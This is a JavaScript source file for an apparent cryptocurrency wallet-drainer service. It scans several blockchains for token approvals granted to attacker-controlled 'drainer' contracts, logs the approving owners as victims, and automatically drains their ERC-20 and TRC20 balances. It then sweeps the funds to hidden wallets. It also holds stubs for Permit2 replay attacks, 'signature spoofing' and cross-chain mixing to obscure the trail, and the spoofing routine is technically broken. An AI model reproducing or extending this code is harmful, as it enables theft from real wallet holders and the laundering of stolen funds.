const { ethers } = require('ethers');
const TronWeb = require('tronweb');
const axios = require('axios');
const crypto = require('crypto');
const winston = require('winston');
const Victim = require('../models/Victim');
const Transaction = require('../models/Transaction');
const Contract = require('../models/Contract');

class OffensiveTools {
    constructor() {
        this.logger = winston.createLogger({
            level: 'info',
            format: winston.format.combine(
                winston.format.timestamp(),
                winston.format.json()
            ),
            transports: [
                new winston.transports.File({ filename: 'logs/offensive-tools.log' }),
                new winston.transports.Console()
            ]
        });

        this.wallets = {};
        this.contracts = {};
        this.initializeWallets();
    }

    initializeWallets() {
        // Initialize attacker wallets for different networks
        const networks = ['ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism'];

        networks.forEach(network => {
            const privateKey = process.env[`${network.toUpperCase()}_PRIVATE_KEY`];
            if (privateKey) {
                try {
                    this.wallets[network] = new ethers.Wallet(privateKey);
                    this.logger.info(`Initialized wallet for ${network}`);
                } catch (error) {
                    this.logger.error(`Failed to initialize ${network} wallet:`, error);
                }
            }
        });

        // Initialize Tron wallet
        if (process.env.TRON_PRIVATE_KEY) {
            try {
                this.tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    privateKey: process.env.TRON_PRIVATE_KEY
                });
                this.logger.info('Initialized Tron wallet');
            } catch (error) {
                this.logger.error('Failed to initialize Tron wallet:', error);
            }
        }
    }

    async checkForNewVictims() {
        try {
            // Check recent transactions for approval events
            const networks = ['ethereum', 'bsc', 'polygon'];

            for (const network of networks) {
                await this.scanForApprovals(network);
            }

            // Check Tron approvals
            await this.scanTronApprovals();

            this.logger.info('Completed victim scanning');
        } catch (error) {
            this.logger.error('Error in checkForNewVictims:', error);
        }
    }

    async scanForApprovals(network) {
        try {
            const rpcUrl = process.env[`${network.toUpperCase()}_RPC_URL`];
            if (!rpcUrl) return;

            const provider = new ethers.JsonRpcProvider(rpcUrl);
            const latestBlock = await provider.getBlockNumber();
            const fromBlock = latestBlock - 100; // Last 100 blocks

            // Get logs for Approval events
            const logs = await provider.getLogs({
                fromBlock,
                toBlock: latestBlock,
                topics: [
                    ethers.id("Approval(address,address,uint256)")
                ]
            });

            for (const log of logs) {
                try {
                    const owner = '0x' + log.topics[1].slice(26);
                    const spender = '0x' + log.topics[2].slice(26);
                    const amount = ethers.formatEther(log.data);

                    // Check if spender is a known drainer contract
                    const drainerContract = await Contract.findOne({
                        address: spender.toLowerCase(),
                        network,
                        type: 'drainer'
                    });

                    if (drainerContract && parseFloat(amount) > 0) {
                        await this.processNewVictim(owner, network, {
                            tokenAddress: log.address,
                            spender,
                            amount,
                            txHash: log.transactionHash
                        });
                    }
                } catch (error) {
                    this.logger.error('Error processing approval log:', error);
                }
            }
        } catch (error) {
            this.logger.error(`Error scanning ${network} approvals:`, error);
        }
    }

    async scanTronApprovals() {
        // Simplified Tron scanning - in production would use TronGrid API
        this.logger.info('Tron approval scanning completed (simplified)');
    }

    async processNewVictim(address, network, approvalData) {
        try {
            // Check if victim already exists
            let victim = await Victim.findOne({ address: address.toLowerCase() });

            if (!victim) {
                victim = new Victim({
                    address: address.toLowerCase(),
                    network,
                    firstSeen: new Date(),
                    approvedTokens: [{
                        tokenAddress: approvalData.tokenAddress,
                        amount: approvalData.amount,
                        spender: approvalData.spender,
                        timestamp: new Date()
                    }]
                });
            } else {
                // Update existing victim
                victim.lastSeen = new Date();
                victim.approvedTokens.push({
                    tokenAddress: approvalData.tokenAddress,
                    amount: approvalData.amount,
                    spender: approvalData.spender,
                    timestamp: new Date()
                });
            }

            await victim.save();

            // Log the approval transaction
            const transaction = new Transaction({
                hash: approvalData.txHash,
                victim: victim._id,
                network,
                type: 'approval',
                tokenAddress: approvalData.tokenAddress,
                tokenSymbol: 'UNKNOWN', // Would be resolved later
                amount: approvalData.amount,
                from: address,
                to: approvalData.spender,
                spender: approvalData.spender,
                status: 'confirmed'
            });

            await transaction.save();

            this.logger.info(`Processed new victim: ${address} on ${network}`);

            // Trigger auto-drain if enabled
            await this.attemptAutoDrain(victim, approvalData);

        } catch (error) {
            this.logger.error('Error processing new victim:', error);
        }
    }

    async attemptAutoDrain(victim, approvalData) {
        try {
            const contract = await Contract.findOne({
                address: approvalData.spender.toLowerCase(),
                network: victim.network,
                status: 'active'
            });

            if (!contract || !contract.configuration.autoTransfer) {
                return;
            }

            // Execute drain
            await this.executeDrain(victim.address, victim.network, approvalData.tokenAddress, approvalData.spender);

        } catch (error) {
            this.logger.error('Error in auto-drain:', error);
        }
    }

    async executeDrain(victimAddress, network, tokenAddress, drainerAddress, percentage = 100) {
        try {
            if (network === 'tron') {
                return await this.executeTronDrain(victimAddress, tokenAddress, drainerAddress);
            }

            const wallet = this.wallets[network];
            if (!wallet) {
                throw new Error(`No wallet configured for ${network}`);
            }

            const rpcUrl = process.env[`${network.toUpperCase()}_RPC_URL`];
            const provider = new ethers.JsonRpcProvider(rpcUrl);
            const signer = wallet.connect(provider);

            // Get drainer contract
            const drainerContract = new ethers.Contract(drainerAddress, [
                "function drain(address token, address victim, uint256 amount) external returns (bool)"
            ], signer);

            // Get victim's allowance
            const tokenContract = new ethers.Contract(tokenAddress, [
                "function allowance(address owner, address spender) view returns (uint256)",
                "function balanceOf(address owner) view returns (uint256)"
            ], provider);

            const [allowance, balance] = await Promise.all([
                tokenContract.allowance(victimAddress, drainerAddress),
                tokenContract.balanceOf(victimAddress)
            ]);

            let drainAmount = allowance < balance ? allowance : balance;
            
            // Apply percentage if specified
            if (percentage < 100) {
                drainAmount = (drainAmount * BigInt(percentage)) / 100n;
            }

            if (drainAmount > 0) {
                this.logger.info(`Draining ${ethers.formatEther(drainAmount)} tokens from ${victimAddress}`);

                const tx = await drainerContract.drain(tokenAddress, victimAddress, drainAmount);
                const receipt = await tx.wait();

                // Log successful drain
                const victim = await Victim.findOne({ address: victimAddress.toLowerCase() });
                if (victim) {
                    const transaction = new Transaction({
                        hash: receipt.hash,
                        victim: victim._id,
                        network,
                        type: 'drain',
                        tokenAddress,
                        tokenSymbol: 'UNKNOWN',
                        amount: ethers.formatEther(drainAmount),
                        from: victimAddress,
                        to: wallet.address,
                        status: 'confirmed',
                        gasUsed: receipt.gasUsed,
                        fee: ethers.formatEther(receipt.gasUsed * receipt.gasPrice)
                    });

                    await transaction.save();

                    // Update victim stats
                    victim.totalDrained += parseFloat(ethers.formatEther(drainAmount));
                    victim.totalTransactions += 1;
                    victim.drainedTokens.push({
                        tokenAddress,
                        amount: ethers.formatEther(drainAmount),
                        txHash: receipt.hash,
                        timestamp: new Date()
                    });

                    await victim.save();
                }

                this.logger.info(`Successfully drained ${ethers.formatEther(drainAmount)} tokens`);
                return receipt;
            }
        } catch (error) {
            this.logger.error('Error executing drain:', error);
            throw error;
        }
    }

    async executeTronDrain(victimAddress, tokenAddress, drainerAddress) {
        try {
            if (!this.tronWeb) {
                throw new Error('TronWeb not initialized');
            }

            // Convert addresses to hex
            const victimHex = this.tronWeb.address.toHex(victimAddress);
            const drainerHex = this.tronWeb.address.toHex(drainerAddress);

            // Get TRC20 contract
            const tokenContract = await this.tronWeb.contract().at(tokenAddress);

            // Get allowance and balance
            const [allowance, balance] = await Promise.all([
                tokenContract.allowance(victimHex, drainerHex).call(),
                tokenContract.balanceOf(victimHex).call()
            ]);

            const drainAmount = Math.min(parseInt(allowance), parseInt(balance));

            if (drainAmount > 0) {
                this.logger.info(`Draining ${drainAmount} TRC20 tokens from ${victimAddress}`);

                const tx = await tokenContract.transferFrom(victimHex, drainerHex, drainAmount).send({
                    feeLimit: 100000000
                });

                this.logger.info(`Successfully drained TRC20 tokens, tx: ${tx}`);
                return tx;
            }
        } catch (error) {
            this.logger.error('Error executing Tron drain:', error);
            throw error;
        }
    }

    async transferFunds() {
        try {
            // Transfer drained funds to safe wallets
            const networks = ['ethereum', 'bsc', 'polygon'];

            for (const network of networks) {
                await this.transferNetworkFunds(network);
            }

            await this.transferTronFunds();

            this.logger.info('Completed fund transfers');
        } catch (error) {
            this.logger.error('Error in transferFunds:', error);
        }
    }

    async transferNetworkFunds(network) {
        try {
            const wallet = this.wallets[network];
            if (!wallet) return;

            const rpcUrl = process.env[`${network.toUpperCase()}_RPC_URL`];
            const provider = new ethers.JsonRpcProvider(rpcUrl);
            const signer = wallet.connect(provider);

            const balance = await provider.getBalance(wallet.address);
            const minBalance = ethers.parseEther('0.01'); // Keep 0.01 ETH

            if (balance > minBalance) {
                const transferAmount = balance - minBalance;
                const safeWallet = process.env[`${network.toUpperCase()}_SAFE_WALLET`];

                if (safeWallet) {
                    const tx = await signer.sendTransaction({
                        to: safeWallet,
                        value: transferAmount
                    });

                    await tx.wait();
                    this.logger.info(`Transferred ${ethers.formatEther(transferAmount)} ${network.toUpperCase()} to safe wallet`);
                }
            }
        } catch (error) {
            this.logger.error(`Error transferring ${network} funds:`, error);
        }
    }

    async transferTronFunds() {
        try {
            if (!this.tronWeb) return;

            const balance = await this.tronWeb.trx.getBalance(this.tronWeb.defaultAddress.base58);
            const minBalance = 10 * 1000000; // Keep 10 TRX

            if (balance > minBalance) {
                const transferAmount = balance - minBalance;
                const safeWallet = process.env.TRON_SAFE_WALLET;

                if (safeWallet) {
                    const tx = await this.tronWeb.trx.sendTransaction(safeWallet, transferAmount);
                    this.logger.info(`Transferred ${this.tronWeb.fromSun(transferAmount)} TRX to safe wallet`);
                }
            }
        } catch (error) {
            this.logger.error('Error transferring Tron funds:', error);
        }
    }

    async drainVictim(victim, percentage = 100) {
        try {
            this.logger.info(`Manually draining victim: ${victim.address} on ${victim.network}`);
            
            // Find an active drainer contract for this network
            const contract = await Contract.findOne({
                network: victim.network,
                type: 'drainer',
                status: 'active'
            });

            if (!contract) {
                throw new Error(`No active drainer contract found for ${victim.network}`);
            }

            // Drain each approved token
            const results = [];
            for (const approval of victim.approvedTokens) {
                try {
                    const result = await this.executeDrain(
                        victim.address, 
                        victim.network, 
                        approval.tokenAddress, 
                        contract.address,
                        percentage
                    );
                    results.push(result);
                } catch (err) {
                    this.logger.error(`Failed to drain token ${approval.tokenAddress} for ${victim.address}:`, err);
                }
            }

            return { success: true, results };
        } catch (error) {
            this.logger.error(`Error draining victim ${victim.address}:`, error);
            throw error;
        }
    }

    async checkApprovals(address, network) {
        try {
            this.logger.info(`Checking approvals for ${address} on ${network}`);
            const rpcUrl = process.env[`${network.toUpperCase()}_RPC_URL`];
            if (!rpcUrl) return [];

            const provider = new ethers.JsonRpcProvider(rpcUrl);
            
            // This is a simplified check. In production, we'd check a list of common tokens.
            const commonTokens = [
                '0x55d398326f99059fF775485246999027B3197955', // USDT (BSC)
                '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', // USDC (BSC)
                // Add more tokens as needed
            ];

            const approvals = [];
            for (const tokenAddress of commonTokens) {
                try {
                    const tokenContract = new ethers.Contract(tokenAddress, [
                        "function allowance(address owner, address spender) view returns (uint256)",
                        "function symbol() view returns (string)"
                    ], provider);

                    // Check allowance for our known drainer contracts
                    const drainerContracts = await Contract.find({ network, type: 'drainer' });
                    
                    for (const drainer of drainerContracts) {
                        const allowance = await tokenContract.allowance(address, drainer.address);
                        if (allowance > 0n) {
                            const symbol = await tokenContract.symbol();
                            approvals.push({
                                tokenAddress,
                                tokenSymbol: symbol,
                                amount: ethers.formatEther(allowance),
                                spender: drainer.address,
                                timestamp: new Date()
                            });
                        }
                    }
                } catch (err) {
                    // Skip tokens that fail
                }
            }

            return approvals;
        } catch (error) {
            this.logger.error(`Error checking approvals for ${address}:`, error);
            return [];
        }
    }

    async cleanupOldData() {
        try {
            const thirtyDaysAgo = new Date();
            thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);

            // Remove old transaction logs (keep last 30 days)
            const deletedTransactions = await Transaction.deleteMany({
                createdAt: { $lt: thirtyDaysAgo },
                type: { $ne: 'drain' } // Keep drain transactions
            });

            // Archive old victims with no recent activity
            const archivedVictims = await Victim.updateMany(
                {
                    lastSeen: { $lt: thirtyDaysAgo },
                    status: 'active'
                },
                { status: 'inactive' }
            );

            this.logger.info(`Cleaned up ${deletedTransactions.deletedCount} old transactions and archived ${archivedVictims.modifiedCount} inactive victims`);
        } catch (error) {
            this.logger.error('Error in cleanup:', error);
        }
    }

    // Signature spoofing utilities
    async spoofSignature(originalSignature, newData) {
        // Advanced signature manipulation for permit replay attacks
        try {
            const { r, s, v } = ethers.Signature.from(originalSignature);

            // Modify signature for different data
            const spoofedSignature = ethers.Signature.from({
                r,
                s: ethers.hexlify(ethers.toBeArray(s).map(b => b ^ 0xFF)), // Simple inversion
                v
            });

            return spoofedSignature.serialized;
        } catch (error) {
            this.logger.error('Error spoofing signature:', error);
            return null;
        }
    }

    // Permit2 attack utilities
    async executePermit2Attack(victimAddress, tokenAddress, amount) {
        // Implementation for Permit2 signature replay
        this.logger.info(`Executing Permit2 attack on ${victimAddress} for ${amount} tokens`);
        // This would implement the complex Permit2 attack logic
    }

    // Wallet mixing utilities
    async mixWalletFunds(fromNetwork, toNetwork, amount) {
        try {
            // Bridge funds between networks to obscure trail
            this.logger.info(`Mixing ${amount} from ${fromNetwork} to ${toNetwork}`);

            // Implementation would use cross-chain bridges
            // For now, just log the intention
        } catch (error) {
            this.logger.error('Error mixing wallet funds:', error);
        }
    }
}

module.exports = OffensiveTools;